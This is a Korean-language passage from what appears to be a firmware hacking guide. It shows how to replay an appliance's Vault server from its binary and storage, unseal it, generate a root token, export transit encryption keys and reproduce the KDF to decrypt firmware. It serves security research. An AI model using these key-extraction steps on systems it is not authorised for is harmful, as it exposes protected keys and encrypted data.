Appliance가 original Vault binary와 storage backend를 함께 제공한다면, Vault internals를 재구현하는 것보다 해당 environment를 replay하는 편이 일반적으로 더 쉽다:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
클론된 KMS에서 root 권한을 사용하여:

- 격리된 클론 내부에서만 transit keys를 export 가능하도록 설정합니다: `vault write transit/keys/<name>/config exportable=true`
- unwrap key를 export합니다: `vault read transit/export/encryption-key/<name>`
- KMS에서 사용한 정확한 padding/hash 조합으로 복구된 RSA key를 시도합니다. PKCS#1 v1.5 복호화 실패와 기본 OAEP 복호화 실패만으로는 key가 잘못되었다고 입증할 수 **없습니다**. 많은 Vault 기반 flow는 SHA-256을 사용하는 OAEP를 사용하는 반면, 일반적인 libraries는 기본적으로 SHA-1을 사용합니다.
- payload가 `Salted__`로 시작한다면 AES-CBC 복호화를 시도하기 전에 vendor의 OpenSSL KDF(`EVP_BytesToKey`, 레거시 appliances에서는 흔히 MD5)를 정확히 재현합니다.

이렇게 하면 "encrypted firmware"는 더 일반적인 문제로 바뀝니다. **appliance 측 operational keys를 복구한 다음, 정확한 unwrap + KDF parameters를 offline에서 재현하는 것**입니다.

## Training and Certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude로 Firmware 크래킹하기: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing Methodology](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [버려진 hardware의 zero days 악용 – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [20달러짜리 Smart Device로 내 집에 접근한 방법](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Now You See mi: Now You're Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - 충전 포트 connector를 통한 Tesla Wall Connector 악용 - Part 2: anti-downgrade 우회](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Make it Blink: Philips Hue Bridge의 Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
{{#include ../../banners/hacktricks-training.md}}
